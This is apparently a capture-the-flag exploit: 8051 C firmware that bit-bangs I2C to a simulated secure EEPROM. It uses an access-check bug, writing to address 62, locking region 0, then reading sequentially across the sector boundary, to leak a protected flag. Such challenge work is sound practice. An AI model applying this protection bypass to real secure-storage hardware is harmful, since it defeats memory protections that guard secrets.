__sfr __at(0xff) POWEROFF;
__sfr __at(0xfe) DEBUG;
__sfr __at(0xfd) CHAROUT;
__xdata __at(0xff00) unsigned char FLAG[0x100];

__sfr __at(0xfa) RAW_I2C_SCL;
__sfr __at(0xfb) RAW_I2C_SDA;

// I2C-M module/chip control data structure.
//__xdata __at(0xfe00) unsigned char I2C_ADDR; // 8-bit version.
//__xdata __at(0xfe01) unsigned char I2C_LENGTH;  // At most 8 (excluding addr).
//__xdata __at(0xfe02) unsigned char I2C_RW_MASK;  // 1 R, 0 W.
//__xdata __at(0xfe03) unsigned char I2C_ERROR_CODE;  // 0 - no errors.
//__xdata __at(0xfe08) unsigned char I2C_DATA[8];  // Don't repeat addr.
//__sfr __at(0xfc) I2C_STATE;  // Read: 0 - idle, 1 - busy; Write: 1 - start

const unsigned char SEEPROM_I2C_ADDR_MEMORY = 0b10100000;
const unsigned char SEEPROM_I2C_ADDR_SECURE = 0b01010000;

void print(const char *str) {
  while (*str) {
    CHAROUT = *str++;
  }
}

void i2c_start(void) {
  RAW_I2C_SCL = 0;
  RAW_I2C_SDA = 1;
  RAW_I2C_SCL = 1;
  RAW_I2C_SDA = 0;
}

void i2c_stop(void) {
  RAW_I2C_SCL = 0;
  RAW_I2C_SDA = 0;
  RAW_I2C_SCL = 1;
  RAW_I2C_SDA = 1;
}

void i2c_send_byte(unsigned char b) {
  for(int i = 0; i < 8; i++) {
    RAW_I2C_SCL = 0;
    RAW_I2C_SDA = ((b >> (7-i)) & 1) != 0;
    RAW_I2C_SCL = 1;
  }
}

unsigned char i2c_recv_byte() {
  unsigned char b = 0;
  for(int i = 0; i < 8; i++) {
    RAW_I2C_SCL = 0;
    RAW_I2C_SCL = 1;
    b = (b << 1) | (RAW_I2C_SDA != 0);
  }

  return b;
}

unsigned char i2c_recv_ack() {
  RAW_I2C_SCL = 0;
  RAW_I2C_SCL = 1;

  unsigned char sda = (RAW_I2C_SDA != 0);

  return sda ^ 1;
}

void main(void) {
  print("Hi!\n");

  unsigned char ack = 0;


  // // try writing something
  // i2c_start();

  // i2c_send_byte(SEEPROM_I2C_ADDR_MEMORY | 0); //write to memory
  // ack = i2c_recv_ack();
  // if(ack)
  //   print("ACK!\n");
  // else
  //   print("No ACK!\n");

  // i2c_send_byte(0); //write to address 0
  // ack = i2c_recv_ack();
  // if(ack)
  //   print("ACK!\n");
  // else
  //   print("No ACK!\n");

  // const char* wr_data = "ABCDEFGHIJKL";
  // while (*wr_data) {
  //   i2c_send_byte(*wr_data++); //write data
    
  //   ack = i2c_recv_ack();
  //   if(ack)
  //     print("ACK!\n");
  //   else
  //     print("No ACK!\n");
  // }

  // i2c_stop();

  // print("Done writing\n");




  // // try reading something
  // i2c_start();

  // i2c_send_byte(SEEPROM_I2C_ADDR_MEMORY | 0); //write to memory
  // ack = i2c_recv_ack();
  // if(ack)
  //   print("ACK!\n");
  // else
  //   print("No ACK!\n");
  
  // i2c_send_byte(0); //read from address 0
  // ack = i2c_recv_ack();
  // if(ack)
  //   print("ACK!\n");
  // else
  //   print("No ACK!\n");
  
  // // re-start
  // i2c_start();

  // i2c_send_byte(SEEPROM_I2C_ADDR_MEMORY | 1); //read from memory
  // ack = i2c_recv_ack();
  // if(ack)
  //   print("ACK!\n");
  // else
  //   print("No ACK!\n");
  
  // for(int i = 0; i < 12; i++) {
  //   unsigned char received = i2c_recv_byte();
  //   ack = i2c_recv_ack();
  //   if(ack)
  //     print("ACK!\n");
  //   else
  //     print("No ACK!\n");
    
  //   print("Received: ");
  //   CHAROUT = received;
  //   print("\n");
  // }

  // i2c_stop();



  i2c_start();

  i2c_send_byte(SEEPROM_I2C_ADDR_MEMORY | 0); //write to memory
  ack = i2c_recv_ack();
  if(ack)
    print("Write ACK!\n");
  else
    print("No write ACK!\n");
  
  // NOTE: we can't write to address 63 because the eeprom is buggy
  // it only lets you write to the address if the NEXT address has the
  // same security flag set or not set as the current one, hence 63 isn't writable yet
  i2c_send_byte(62); //write to address 62
  ack = i2c_recv_ack();
  if(ack)
    print("Address ACK!\n");
  else
    print("No address ACK!\n");

  i2c_send_byte(0x41); //write data to 62, address is now valid and points to 63
  ack = i2c_recv_ack();
  if(ack)
    print("Data written ACK!\n");
  else
    print("No data written ACK!\n");

  // re-start to write into control region and mark our current section secure
  // back to back reads can then cross the sector bound between 0 and 1 (which
  // contains the flag as the check passes)
  i2c_start();
  
  i2c_send_byte(SEEPROM_I2C_ADDR_SECURE | 1); //write to security region lockout and lock region 0
  ack = i2c_recv_ack();
  if(ack)
    print("Write security ACK!\n");
  else
    print("No write security ACK!\n");
  
  
  // re-start to initiate a read from the still valid address
  i2c_start();

  i2c_send_byte(SEEPROM_I2C_ADDR_MEMORY | 1); //read from memory
  ack = i2c_recv_ack();
  if(ack)
    print("Read ACK!\n");
  else
    print("No read ACK!\n");

  char flag[64] = {0};

  // read stuff starting from 63 - discard address 63
  for(int i = 0; i < 65; i++) {
    unsigned char received = i2c_recv_byte();
    ack = i2c_recv_ack();
    if(ack)
      print("Secure ACK!\n");
    else
      print("No secure ACK!\n");
    
    if(i > 0)
      flag[i-1] = received;

    print("Received: ");
    CHAROUT = received;
    print("\n");
  }

  i2c_stop();

  print("Flag: ");
  print(flag);
  print("\n");

  POWEROFF = 1;
}
